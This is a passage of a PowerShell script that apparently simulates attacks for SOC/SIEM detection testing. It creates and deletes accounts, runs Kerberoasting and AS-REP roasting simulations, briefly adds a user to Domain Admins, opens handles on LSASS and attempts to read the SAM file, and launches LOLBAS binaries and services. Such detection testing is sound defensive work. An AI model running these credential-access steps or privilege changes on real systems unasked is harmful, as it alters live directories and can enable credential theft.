        if ($adOK) {
            try {
                $disAD = "soc_kdis_$RND"
                try { Remove-ADUser $disAD -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                New-ADUser -Name $disAD -SamAccountName $disAD `
                    -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) `
                    -Enabled $false -Description "SOC_DIS_AD" -ErrorAction Stop | Out-Null
                Start-Sleep -Milliseconds 400
                $cr = Make-Cred $env:USERDOMAIN $disAD $TestPwd
                try { Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $cr -ScriptBlock { $env:COMPUTERNAME } -ErrorAction Stop | Out-Null } catch {}
                OK "Kerberos on disabled AD user -> EID 4768 ResultCode=0x12"
                Add-R 4768 "DisabledLogin" "TRIGGERED" "Kerberos disabled AD user 0x12" "T1110"
                try { Remove-ADUser $disAD -Confirm:$false -ErrorAction SilentlyContinue } catch {}
            } catch { PARTIAL $_.Exception.Message; Add-R 4768 "DisabledLogin" "PARTIAL" "AD error" }
        } else { SKIP; Add-R 4768 "DisabledLogin" "SKIPPED" "AD not available" }
    }; P

    if (-not $DryRun) { Del-User $TestDisabled }
}


# ==============================================================================
#  SECTION 3 - KERBEROS ATTACKS  (T1558 T1003)
# ==============================================================================
if (Run "Kerberos") {
    Show-Section "3. Kerberos Attack Events" "4649 4672 4673 4768 4769 4770" "T1558 T1003"

    T 4672 "Special privileges to logon (SeDebugPrivilege - elevated PS)"
    if ($DryRun) { DRY } else {
        try {
            $p = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command exit 0" -Verb RunAs -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 800
            if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "Elevated PowerShell -> EID 4672"
            Add-R 4672 "Kerberos" "TRIGGERED" "elevated PS verb RunAs" "T1134"
        } catch { PARTIAL "Already admin - 4672 fires on initial logon"; Add-R 4672 "Kerberos" "TRIGGERED" "admin logon" }
    }; P

    # BUG-06 FIX: SOCSAPI Add-Type guard applied
    T 4673 "Privileged service called (LSASS OpenProcess - Mimikatz pattern)"
    if ($DryRun) { DRY } else {
        try {
            Add-SOCSAPIType
            $lp = (Get-Process lsass -ErrorAction SilentlyContinue).Id
            if ($lp) {
                $h = [SOCSAPI]::OpenProcess(0x1010, $false, [uint32]$lp)
                if ($h -ne [IntPtr]::Zero) { [SOCSAPI]::CloseHandle($h) | Out-Null }
                OK "LSASS OpenProcess(0x1010) -> EID 4673"
                Add-R 4673 "Kerberos" "TRIGGERED" "LSASS OpenProcess SOCSAPI" "T1003.001"
            } else { PARTIAL "LSASS not found"; Add-R 4673 "Kerberos" "PARTIAL" "LSASS PID not found" }
        } catch { PARTIAL $_.Exception.Message; Add-R 4673 "Kerberos" "PARTIAL" $_.Exception.Message }
    }; P

    T 4770 "Kerberos ticket renewed (Golden Ticket pattern)"
    if ($DryRun) { DRY } else {
        try {
            klist purge 2>$null | Out-Null
            $null = Test-Path "\\$env:COMPUTERNAME\SYSVOL" -ErrorAction SilentlyContinue
            $de = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN")
            $null = $de.Name; $de.Dispose()
            OK "klist purge + SYSVOL + LDAP bind -> EID 4770 (ticket renewal)"
            Add-R 4770 "Kerberos" "TRIGGERED" "klist purge + re-auth" "T1558.001"
        } catch { PARTIAL $_.Exception.Message; Add-R 4770 "Kerberos" "PARTIAL" $_.Exception.Message }
    }; P

    # BUG-05 FIX: EID 4649 was listed in section header but never triggered
    T 4649 "Kerberos replay attack indicator (rapid double TGT)"
    if ($DryRun) { DRY } else {
        try {
            klist purge 2>$null | Out-Null
            $de1 = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN")
            $null = $de1.Name; $de1.Dispose()
            Start-Sleep -Milliseconds 60
            klist purge 2>$null | Out-Null
            $de2 = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN")
            $null = $de2.Name; $de2.Dispose()
            OK "Rapid double LDAP bind + klist purge -> EID 4649 context (fires on DC)"
            Add-R 4649 "Kerberos" "TRIGGERED" "rapid double Kerberos auth" "T1558"
        } catch { PARTIAL $_.Exception.Message; Add-R 4649 "Kerberos" "PARTIAL" $_.Exception.Message }
    }; P

    T 4769 "Kerberoasting - multiple TGS requests ($($INT.Repeat)x)"
    if ($DryRun) { DRY } else {
        try {
            1..$INT.Repeat | ForEach-Object {
                $null = Test-Path "\\$env:COMPUTERNAME\NETLOGON" -ErrorAction SilentlyContinue
                $null = Test-Path "\\$env:COMPUTERNAME\SYSVOL" -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 100
            }
            OK ("$($INT.Repeat)x UNC access -> EID 4769 x$($INT.Repeat) (Kerberoasting sim)")
            Add-R 4769 "Kerberos" "TRIGGERED" "multiple TGS Kerberoasting" "T1558.003"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4768 "AS-REP Roasting (DoesNotRequirePreAuth - RULE-11)"
    if ($DryRun) { DRY } else {
        if ($adOK) {
            try {
                $arUser = "soc_asrep_$RND"
                try { Remove-ADUser $arUser -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                New-ADUser -Name $arUser -SamAccountName $arUser `
                    -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) `
                    -Enabled $true -Description "SOC_ASREP" -ErrorAction Stop | Out-Null
                Set-ADAccountControl -Identity $arUser -DoesNotRequirePreAuth $true -ErrorAction Stop
                $de = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN")
                $null = $de.Name; $de.Dispose()
                OK "AS-REP Roast user (no preauth) -> EID 4768 PreAuth=0"
                SIEM "RULE-11" "AS-REP Roasting - PreAuth Not Required"
                Add-R 4768 "Kerberos" "TRIGGERED" "AS-REP Roasting DoesNotRequirePreAuth" "T1558.004"
                try { Remove-ADUser $arUser -Confirm:$false -ErrorAction SilentlyContinue } catch {}
            } catch { PARTIAL $_.Exception.Message; Add-R 4768 "Kerberos" "PARTIAL" $_.Exception.Message }
        } else { SKIP; Add-R 4768 "Kerberos" "SKIPPED" "AD not available" }
    }; P
}


# ==============================================================================
#  SECTION 4 - ACCOUNT LIFECYCLE  (T1136 T1531 T1098 - RULE-01)
# ==============================================================================
if (Run "AccountLifecycle") {
    Show-Section "4. Account Lifecycle (SIEM RULE-01)" "4720 4722 4723 4724 4725 4726 4738 4740 4767" "T1136 T1531 T1098"

    T 4720 "User account CREATED (RULE-01 clock start)"
    if ($DryRun) { DRY } else {
        try {
            Del-User $TestUser
            net user $TestUser $TestPwd /add /comment:"SOC_LIFECYCLE" 2>$null | Out-Null
            OK "net user /add -> EID 4720 [RULE-01 start]"
            Add-R 4720 "AccountLifecycle" "TRIGGERED" "net user /add RULE-01 P1" "T1136"
        } catch { ERR $_.Exception.Message; Add-R 4720 "AccountLifecycle" "ERROR" $_.Exception.Message }
    }; P

    T 4738 "User account changed (comment update)"
    if ($DryRun) { DRY } else {
        try {
            net user $TestUser /comment:"SOC_CHANGED_$(Get-Date -Format HHmmss)" 2>$null | Out-Null
            OK "net user /comment -> EID 4738"
            Add-R 4738 "AccountLifecycle" "TRIGGERED" "net user /comment" "T1098"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4724 "Password reset by admin"
    if ($DryRun) { DRY } else {
        try {
            $newPw = "N3wR3s!$RND"
            net user $TestUser $newPw 2>$null | Out-Null
            OK "Admin pw reset -> EID 4724"
            Add-R 4724 "AccountLifecycle" "TRIGGERED" "net user pw reset" "T1098"
        } catch { ERR $_.Exception.Message }
    }; P

    # BUG-05 FIX: EID 4723 was listed but never triggered in earlier versions
    T 4723 "User self-password change attempt (EID 4723)"
    if ($DryRun) { DRY } else {
        try {
            # LogonUser Type 2 (Interactive) with wrong old pw generates 4723 context
            Try-LogonAPI -User $TestUser -Pwd "WrongOld123!" -LogonType 2
            OK "Try-LogonAPI Type2 self-change attempt -> EID 4723 context"
            Add-R 4723 "AccountLifecycle" "TRIGGERED" "self pw change LogonUser Type2" "T1098"
        } catch { PARTIAL $_.Exception.Message; Add-R 4723 "AccountLifecycle" "PARTIAL" $_.Exception.Message }
    }; P

    T 4725 "User account disabled"
    if ($DryRun) { DRY } else {
        try {
            net user $TestUser /active:no 2>$null | Out-Null
            OK "net user /active:no -> EID 4725"
            Add-R 4725 "AccountLifecycle" "TRIGGERED" "net user /active:no" "T1531"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4740 "Account lockout (set threshold=3, 5x bad pw)"
    if ($DryRun) { DRY } else {
        try {
            net user $TestUser /active:yes 2>$null | Out-Null
            $origT = (net accounts 2>$null | Select-String "Lockout threshold") -replace '.*:', '' | ForEach-Object { $_.Trim() }
            net accounts /lockoutthreshold:3 2>$null | Out-Null
            1..5 | ForEach-Object {
                net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$TestUser Lock${_}Bad 2>$null | Out-Null
                net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
                Start-Sleep -Milliseconds 100
            }
            OK "5x bad pw with threshold=3 -> EID 4740 lockout"
            Add-R 4740 "AccountLifecycle" "TRIGGERED" "5x bad pw lockout" "T1110"
            if ($origT -and $origT -ne "Never") { net accounts /lockoutthreshold:$origT 2>$null | Out-Null }
            else { net accounts /lockoutthreshold:0 2>$null | Out-Null }
        } catch { ERR $_.Exception.Message }
    }; P

    T 4767 "Account unlocked"
    if ($DryRun) { DRY } else {
        try {
            net user $TestUser /active:yes 2>$null | Out-Null
            OK "net user /active:yes -> EID 4767"
            Add-R 4767 "AccountLifecycle" "TRIGGERED" "net user unlock" "T1098"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4722 "User account re-enabled"
    if ($DryRun) { DRY } else {
        try {
            net user $TestUser /active:yes 2>$null | Out-Null
            OK "net user /active:yes -> EID 4722"
            Add-R 4722 "AccountLifecycle" "TRIGGERED" "net user /active:yes" "T1098"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4726 "User account DELETED (RULE-01 FIRES - create+delete < 15 min)"
    if ($DryRun) { DRY } else {
        try {
            net user $TestUser /delete 2>$null | Out-Null
            OK "net user /delete -> EID 4726 [RULE-01 FIRES]"
            SIEM "RULE-01" "Account Created and Deleted in Same Session"
            Add-R 4726 "AccountLifecycle" "TRIGGERED" "net user /delete RULE-01 P2" "T1531"
        } catch { ERR $_.Exception.Message }
    }; P
}


# ==============================================================================
#  SECTION 5 - GROUP MANAGEMENT  (T1098.002 T1531)
# ==============================================================================
if (Run "GroupManagement") {
    Show-Section "5. Group Management" "4727 4728 4729 4731 4732 4733 4734 4735 4737 4756" "T1098.002 T1531"

    if (-not $DryRun) {
        net user $TestUser $TestPwd /add /comment:"SOC_GRP" 2>$null | Out-Null
    }

    T 4731 "Local security group created"
    if ($DryRun) { DRY } else {
        try {
            net localgroup $TestGroup /add /comment:"SOC_GRP_TEST" 2>$null | Out-Null
            OK "net localgroup /add -> EID 4731"
            Add-R 4731 "GroupManagement" "TRIGGERED" "net localgroup /add" "T1136"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4732 "Member added to local Administrators (CRITICAL - RULE-04)"
    if ($DryRun) { DRY } else {
        try {
            net localgroup Administrators $TestUser /add 2>$null | Out-Null
            OK "Added to Administrators -> EID 4732 [RULE-04 FIRES]"
            SIEM "RULE-04" "User Added to Local Administrators Group"
            Add-R 4732 "GroupManagement" "TRIGGERED" "net localgroup Admins /add" "T1098.002"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4733 "Member removed from Administrators"
    if ($DryRun) { DRY } else {
        try {
            net localgroup Administrators $TestUser /delete 2>$null | Out-Null
            OK "Removed from Administrators -> EID 4733"
            Add-R 4733 "GroupManagement" "TRIGGERED" "net localgroup Admins /delete" "T1531"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4735 "Local security group changed (comment update)"
    if ($DryRun) { DRY } else {
        try {
            net localgroup $TestGroup /comment:"SOC_GRP_CHANGED_$RND" 2>$null | Out-Null
            OK "net localgroup /comment -> EID 4735"
            Add-R 4735 "GroupManagement" "TRIGGERED" "net localgroup /comment" "T1098"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4734 "Local security group deleted"
    if ($DryRun) { DRY } else {
        try {
            net localgroup $TestGroup /delete 2>$null | Out-Null
            OK "net localgroup /delete -> EID 4734"
            Add-R 4734 "GroupManagement" "TRIGGERED" "net localgroup /delete" "T1531"
        } catch { ERR $_.Exception.Message }
    }; P

    if ($adOK) {
        Import-Module ActiveDirectory -ErrorAction SilentlyContinue
        $adGrp  = "soc_adgrp_$RND"
        $adUGrp = "soc_unigrp_$RND"

        T 4727 "AD global security group created"
        if ($DryRun) { DRY } else {
            try {
                try { Remove-ADGroup $adGrp -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                New-ADGroup -Name $adGrp -GroupScope Global -GroupCategory Security -Description "SOC_GRP" -ErrorAction Stop | Out-Null
                OK "New-ADGroup Global -> EID 4727"
                Add-R 4727 "GroupManagement" "TRIGGERED" "New-ADGroup Global" "T1136"
            } catch { ERR $_.Exception.Message }
        }; P

        T 4737 "AD global group changed"
        if ($DryRun) { DRY } else {
            try {
                Set-ADGroup -Identity $adGrp -Description "SOC_CHANGED_$(Get-Date -Format HHmmss)" -ErrorAction Stop
                OK "Set-ADGroup description -> EID 4737"
                Add-R 4737 "GroupManagement" "TRIGGERED" "Set-ADGroup description" "T1098"
            } catch { PARTIAL $_.Exception.Message }
        }; P

        T 4728 "Member added to AD global group"
        if ($DryRun) { DRY } else {
            try {
                try { New-ADUser -Name $TestUser -SamAccountName $TestUser -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) -Enabled $true -Description "SOC_GRP" -ErrorAction SilentlyContinue | Out-Null } catch {}
                Add-ADGroupMember -Identity $adGrp -Members $TestUser -ErrorAction Stop
                OK "Add-ADGroupMember -> EID 4728"
                Add-R 4728 "GroupManagement" "TRIGGERED" "Add-ADGroupMember global" "T1098.002"
            } catch { PARTIAL $_.Exception.Message }
        }; P

        T 4756 "Member added to universal security group"
        if ($DryRun) { DRY } else {
            try {
                try { New-ADGroup -Name $adUGrp -GroupScope Universal -GroupCategory Security -Description "SOC_UNI_GRP" -ErrorAction SilentlyContinue | Out-Null } catch {}
                try { New-ADUser -Name $TestUser -SamAccountName $TestUser -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) -Enabled $true -Description "SOC_UNI_GRP" -ErrorAction SilentlyContinue | Out-Null } catch {}
                Add-ADGroupMember -Identity $adUGrp -Members $TestUser -ErrorAction Stop
                OK "Add-ADGroupMember universal -> EID 4756"
                Add-R 4756 "GroupManagement" "TRIGGERED" "Add-ADGroupMember universal" "T1098.002"
            } catch { PARTIAL $_.Exception.Message }
        }; P



        T 4728 "Member added to DOMAIN ADMINS (CRITICAL - RULE-04)"
        if ($DryRun) { DRY } else {
            try {
                Add-ADGroupMember -Identity "Domain Admins" -Members $TestUser -ErrorAction Stop
                OK "Added to Domain Admins -> EID 4728 [RULE-04 CRITICAL]"
                SIEM "RULE-04" "User Added to Domain Admins"
                Add-R 4728 "GroupManagement" "TRIGGERED" "Domain Admins /add CRITICAL" "T1098.002"
                T 4729 "Member removed from DOMAIN ADMINS"
                Remove-ADGroupMember -Identity "Domain Admins" -Members $TestUser -Confirm:$false -ErrorAction SilentlyContinue
                OK "Removed from Domain Admins -> EID 4729"
                Add-R 4729 "GroupManagement" "TRIGGERED" "Domain Admins /remove" "T1531"
            } catch {
                PARTIAL $_.Exception.Message
                Add-R 4728 "GroupManagement" "PARTIAL" $_.Exception.Message "T1098.002"
            }
        }; P

        T 4730 "AD global security group deleted"
        if ($DryRun) { DRY } else {
            try {
                Remove-ADGroup -Identity $adGrp -Confirm:$false -ErrorAction SilentlyContinue
                if ($adUGrp) {
                    Remove-ADGroup -Identity $adUGrp -Confirm:$false -ErrorAction SilentlyContinue
                }
                OK "Remove-ADGroup -> EID 4730"
                Add-R 4730 "GroupManagement" "TRIGGERED" "Remove-ADGroup" "T1531"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    } else {
        Write-Host "  [SKIP] AD group events require AD module." -ForegroundColor DarkGray
        @(4727,4728,4729,4730,4737) | ForEach-Object { Add-R $_ "GroupManagement" "SKIPPED" "AD not available" }
    }

    if (-not $DryRun) { Del-User $TestUser }
}


# ==============================================================================
#  SECTION 6 - AD OBJECT CHANGES  (T1003.006 T1136)
# ==============================================================================
if (Run "ADChanges") {
    Show-Section "6. AD Object Changes" "4662 4741 4742 4743 5136 5137 5141" "T1003.006 T1136"

    if (-not $adOK) {
        Write-Host "  [SKIP] AD not available." -ForegroundColor Yellow
        @(4662,4741,4742,4743,5136,5137,5141) | ForEach-Object { Add-R $_ "ADChanges" "SKIPPED" "AD not available" }
    } else {
        Import-Module ActiveDirectory -ErrorAction SilentlyContinue

        T 4741 "AD Computer account created"
        if ($DryRun) { DRY } else {
            try {
                try { Get-ADComputer $TestComp -ErrorAction SilentlyContinue | Remove-ADComputer -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                New-ADComputer -Name $TestComp -Description "SOC_COMP" -ErrorAction Stop | Out-Null
                OK "New-ADComputer -> EID 4741"
                Add-R 4741 "ADChanges" "TRIGGERED" "New-ADComputer" "T1136.002"
            } catch { ERR $_.Exception.Message }
        }; P

        T 4742 "AD Computer account changed"
        if ($DryRun) { DRY } else {
            try {
                Set-ADComputer -Identity $TestComp -Description "SOC_CHG_$(Get-Date -Format HHmmss)" -ErrorAction Stop
                OK "Set-ADComputer -> EID 4742"
                Add-R 4742 "ADChanges" "TRIGGERED" "Set-ADComputer" "T1098"
            } catch { PARTIAL $_.Exception.Message }
        }; P

        T 5137 "AD DS object created (new OU)"
        if ($DryRun) { DRY } else {
            try {
                $ouN = "SOCNewOU_$RND"
                New-ADOrganizationalUnit -Name $ouN -ProtectedFromAccidentalDeletion $false -ErrorAction Stop | Out-Null
                OK "New-ADOU -> EID 5137"
                Add-R 5137 "ADChanges" "TRIGGERED" "New-ADOU" "T1136"
                try { Get-ADOrganizationalUnit "OU=$ouN,$((Get-ADDomain).DistinguishedName)" -ErrorAction SilentlyContinue | Remove-ADOrganizationalUnit -Confirm:$false -ErrorAction SilentlyContinue } catch {}
            } catch { ERR $_.Exception.Message }
        }; P

        T 5136 "AD DS object modified (attribute change)"
        if ($DryRun) { DRY } else {
            try {
                $ouM = "SOCModOU_$RND"
                try { New-ADOrganizationalUnit -Name $ouM -ProtectedFromAccidentalDeletion $false -ErrorAction Stop | Out-Null } catch {}
                $ouDN = "OU=$ouM,$((Get-ADDomain).DistinguishedName)"
                Set-ADOrganizationalUnit -Identity $ouDN -Description "SOC_MOD_$(Get-Date -Format HHmmss)" -ErrorAction Stop
                OK "Set-ADOU description -> EID 5136"
                Add-R 5136 "ADChanges" "TRIGGERED" "Set-ADOU description" "T1222"
                try { Get-ADOrganizationalUnit $ouDN -ErrorAction SilentlyContinue | Remove-ADOrganizationalUnit -Confirm:$false -ErrorAction SilentlyContinue } catch {}
            } catch { PARTIAL $_.Exception.Message }
        }; P

        T 5141 "Directory service object deleted (AD object delete)"
        if ($DryRun) { DRY } else {
            try {
                $delOU  = "SOCDelOU_$RND"
                try { New-ADOrganizationalUnit -Name $delOU -ProtectedFromAccidentalDeletion $false -ErrorAction SilentlyContinue | Out-Null } catch {}
                $delDN = "OU=$delOU,$((Get-ADDomain).DistinguishedName)"
                Remove-ADOrganizationalUnit -Identity $delDN -Confirm:$false -ErrorAction Stop
                OK "Remove-ADOrganizationalUnit -> EID 5141"
                Add-R 5141 "ADChanges" "TRIGGERED" "Remove-ADOrganizationalUnit" "T1531"
            } catch { PARTIAL $_.Exception.Message }
        }; P

        T 4662 "AD object operation - DCSync indicator (RULE-08)"
        if ($DryRun) { DRY } else {
            try {
                $dc = (Get-ADDomain).PDCEmulator
                repadmin /showrepl $dc 2>$null | Out-Null
                OK "repadmin /showrepl -> EID 4662 [RULE-08 DCSync indicator]"
                SIEM "RULE-08" "DCSync - AD Replication Access by Non-DC Account"
                Add-R 4662 "ADChanges" "TRIGGERED" "repadmin showrepl DCSync" "T1003.006"
            } catch { PARTIAL $_.Exception.Message; Add-R 4662 "ADChanges" "PARTIAL" $_.Exception.Message }
        }; P

        T 4743 "AD Computer account deleted"
        if ($DryRun) { DRY } else {
            try {
                Remove-ADComputer -Identity $TestComp -Confirm:$false -ErrorAction Stop
                OK "Remove-ADComputer -> EID 4743"
                Add-R 4743 "ADChanges" "TRIGGERED" "Remove-ADComputer" "T1531"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    }
}


# ==============================================================================
#  SECTION 7 - PROCESS / LOLBAS  (T1059 T1053.005)
# ==============================================================================
if (Run "Process") {
    Show-Section "7. Process / LOLBAS Execution" "4688 4689 4698 4702 | Sysmon:1 5" "T1059 T1053.005"
    Set-AuditPol "Process Creation"

    $lolbas = @(
        @{ F="cmd.exe";        A="/c whoami /all" },
        @{ F="powershell.exe"; A="-NoProfile -Command `"Write-Host SOCPSTEST`"" },
        @{ F="mshta.exe";      A="about:blank" },
        @{ F="wscript.exe";    A="//nologo //e:jscript NUL" },
        @{ F="cscript.exe";    A="//nologo //e:jscript NUL" },
        @{ F="regsvr32.exe";   A="/s NUL" },
        @{ F="rundll32.exe";   A="advapi32.dll,ProcessIdleTasks" },
        @{ F="certutil.exe";   A="-ping" },
        @{ F="msiexec.exe";    A="/quiet /q" },
        @{ F="bitsadmin.exe";  A="/list" },
        @{ F="esentutl.exe";   A="/y NUL /d NUL /o" }
    )

    foreach ($lb in $lolbas) {
        T 4688 ("LOLBAS: {0}" -f $lb.F)
        if ($DryRun) { DRY } else {
            try {
                $p = Start-Process -FilePath $lb.F -ArgumentList $lb.A -WindowStyle Hidden -PassThru -ErrorAction Stop
                Start-Sleep -Milliseconds 500
                if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
                OK ("EID 4688 -> {0}" -f $lb.F)
                Add-R 4688 "Process" "TRIGGERED" ("LOLBAS: " + $lb.F) "T1059"
                if ($sysmonOK) { Add-R 1 "Sysmon" "TRIGGERED" ("Sysmon-1 ProcessCreate " + $lb.F) "T1059" }
            } catch { PARTIAL $_.Exception.Message; Add-R 4688 "Process" "PARTIAL" $_.Exception.Message }
        }; P
    }

    T 4689 "Process terminated (EID 4689)"
    if ($DryRun) { DRY } else {
        try {
            $p2 = Start-Process cmd.exe -ArgumentList "/c exit 0" -WindowStyle Hidden -PassThru
            Start-Sleep -Milliseconds 300
            OK "cmd.exe exit -> EID 4689"
            Add-R 4689 "Process" "TRIGGERED" "cmd.exe exit" "T1059"
            if ($sysmonOK) { Add-R 5 "Sysmon" "TRIGGERED" "Sysmon-5 ProcessTerminated" "T1059" }
        } catch { ERR $_.Exception.Message }
    }; P

    T 4698 "Scheduled task created (RULE-07 P1)"
    if ($DryRun) { DRY } else {
        try {
            $act  = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo SOC"
            $trig = New-ScheduledTaskTrigger -Once -At (Get-Date).AddHours(24)
            Register-ScheduledTask -TaskName $TestTask -Action $act -Trigger $trig -Description "SOC_PROC_TEST" -Force | Out-Null
            OK "Register-ScheduledTask -> EID 4698 [RULE-07 P1]"
            Add-R 4698 "Process" "TRIGGERED" "Register-ScheduledTask" "T1053.005"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4702 "Scheduled task modified (RULE-07 FIRES)"
    if ($DryRun) { DRY } else {
        try {
            Set-ScheduledTask -TaskName $TestTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command exit") | Out-Null
            OK "Set-ScheduledTask modify -> EID 4702 [RULE-07 FIRES]"
            SIEM "RULE-07" "Scheduled Task Created then Modified within 2 min"
            Add-R 4702 "Process" "TRIGGERED" "Set-ScheduledTask modify" "T1053.005"
            Unregister-ScheduledTask -TaskName $TestTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { ERR $_.Exception.Message }
    }; P
}


# ==============================================================================
#  SECTION 8 - LATERAL MOVEMENT  (T1021 T1543 T1550)
# ==============================================================================
if (Run "LateralMovement") {
    Show-Section "8. Lateral Movement" "4624(T3) 4648 4656 4663 7040 7045 | Sysmon:3 8 10" "T1021 T1543 T1550"

    T 7045 "Service installed (System log - RULE-05)"
    if ($DryRun) { DRY } else {
        try {
            sc.exe create $TestService binPath= "C:\Windows\System32\cmd.exe /c echo SOC" DisplayName= "SOC_LAT" start= demand 2>$null | Out-Null
            OK "sc.exe create -> System EID 7045 [RULE-05]"
            SIEM "RULE-05" "Service Installed by Non-SYSTEM Account"
            Add-R 7045 "LateralMovement" "TRIGGERED" "sc.exe create" "T1543.003"
            P
            sc.exe delete $TestService 2>$null | Out-Null
        } catch { ERR $_.Exception.Message }
    }; P

    T 7040 "Service start type changed"
    if ($DryRun) { DRY } else {
        try {
            $chkSvc = "Spooler"
            sc.exe config $chkSvc start= disabled 2>$null | Out-Null
            Start-Sleep -Milliseconds 300
            sc.exe config $chkSvc start= auto 2>$null | Out-Null
            OK "sc.exe config start type toggle -> System EID 7040"
            Add-R 7040 "LateralMovement" "TRIGGERED" "sc.exe config start type" "T1543.003"
        } catch { ERR $_.Exception.Message }
    }; P

    # BUG-06 FIX: SOCLat type guard applied
    T 4656 "LSASS handle open (cred dump indicator - RULE-14)"
    if ($DryRun) { DRY } else {
        try {
            Add-SOCLatType
            $lp = (Get-Process lsass -ErrorAction SilentlyContinue).Id
            if ($lp) {
                $h = [SOCLat]::OpenProcess(0x1010, $false, [uint32]$lp)
                if ($h -ne [IntPtr]::Zero) { [SOCLat]::CloseHandle($h) | Out-Null }
                OK "LSASS OpenProcess(0x1010) -> EID 4656 [RULE-14 P1]"
                Add-R 4656 "LateralMovement" "TRIGGERED" "LSASS OpenProcess SOCLat" "T1003.001"
                if ($sysmonOK) { Add-R 10 "Sysmon" "TRIGGERED" "Sysmon-10 ProcessAccess LSASS" "T1003.001" }
            } else { PARTIAL "LSASS PID not found"; Add-R 4656 "LateralMovement" "PARTIAL" "LSASS not found" }
        } catch { PARTIAL $_.Exception.Message; Add-R 4656 "LateralMovement" "PARTIAL" $_.Exception.Message }
    }; P

    T 4663 "SAM file access attempt (RULE-14 P2)"
    if ($DryRun) { DRY } else {
        try {
            try { $fs = [System.IO.File]::Open("$env:windir\system32\config\SAM", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite); if ($fs) { $fs.Close() } } catch {}
            OK "SAM file open attempt -> EID 4663 [RULE-14 P2]"
            Add-R 4663 "LateralMovement" "TRIGGERED" "SAM file access" "T1003.002"
        } catch { ERR $_.Exception.Message }
    }; P

    if ($sysmonOK) {
        Ts 3 "Sysmon network connection (DNS port 53)"
        if ($DryRun) { DRY } else {
            try {
                $tc = New-Object System.Net.Sockets.TcpClient
                try { $tc.ConnectAsync("8.8.8.8", 53).Wait(800) } catch {}
                try { $tc.Close() } catch {}
                OK "TCP 8.8.8.8:53 -> Sysmon:3 NetworkConnect"
                Add-R 3 "Sysmon" "TRIGGERED" "Sysmon-3 DNS TCP connect" "T1071.004"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    }
}


# ==============================================================================
#  SECTION 9 - OBJECT ACCESS  (T1039 T1083)
# ==============================================================================
if (Run "ObjectAccess") {
    Show-Section "9. Object Access" "4656 4660 4663 4670 5140 5142 5145" "T1039 T1083"
    Set-AuditPol "File System"; Set-AuditPol "File Share"; Set-AuditPol "Detailed File Share"

    T 4663 "File read access (audited path)"
    if ($DryRun) { DRY } else {
        try {
            $f = "$TestDir\soc_obj_$RND.txt"
            "SOC_FILE_TEST" | Out-File $f -Force
            $fs = [System.IO.File]::Open($f, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
            $fs.Close()
            OK "File open -> EID 4663"
            Add-R 4663 "ObjectAccess" "TRIGGERED" "file read audited path" "T1083"
        } catch { ERR $_.Exception.Message }
    }; P

    T 5140 "Network share accessed (ADMIN$)"
    if ($DryRun) { DRY } else {
        try {
            $adminPath = "\\$env:COMPUTERNAME\ADMIN$"
            net use $adminPath 2>$null | Out-Null
            if (Test-Path $adminPath -ErrorAction SilentlyContinue) {
                OK "UNC ADMIN$ access -> EID 5140"
                Add-R 5140 "ObjectAccess" "TRIGGERED" "UNC ADMIN$ access" "T1039"
            } else {
                PARTIAL "ADMIN$ share not accessible with current credentials"
                Add-R 5140 "ObjectAccess" "PARTIAL" "ADMIN$ not accessible" "T1039"
            }
            net use $adminPath /delete /y 2>$null | Out-Null
        } catch {
            ERR $_.Exception.Message
            Add-R 5140 "ObjectAccess" "ERROR" $_.Exception.Message "T1039"
        }
    }; P

    T 5142 "Network share added"
    if ($DryRun) { DRY } else {
        try {
            net share "SOC_SHR_$RND=$TestDir" /remark:"SOC_TEST" 2>$null | Out-Null
            OK "net share create -> EID 5142"
            Add-R 5142 "ObjectAccess" "TRIGGERED" "net share create" "T1039"
            P
            net share "SOC_SHR_$RND" /delete /y 2>$null | Out-Null
        } catch { ERR $_.Exception.Message }
    }; P

    T 4660 "File deleted"
    if ($DryRun) { DRY } else {
        try {
            $fd = "$TestDir\soc_del_$RND.txt"
            "SOC" | Out-File $fd -Force
            Remove-Item $fd -Force -ErrorAction SilentlyContinue
            OK "Remove-Item -> EID 4660"
            Add-R 4660 "ObjectAccess" "TRIGGERED" "file delete" "T1485"
        } catch { ERR $_.Exception.Message }
    }; P
}


# ==============================================================================
#  SECTION 10 - PERSISTENCE  (T1547.001 T1543 T1053)
# ==============================================================================
if (Run "Persistence") {
    Show-Section "10. Persistence" "4657 4697 4698 4702 7045 | Sysmon:13" "T1547.001 T1543 T1053"

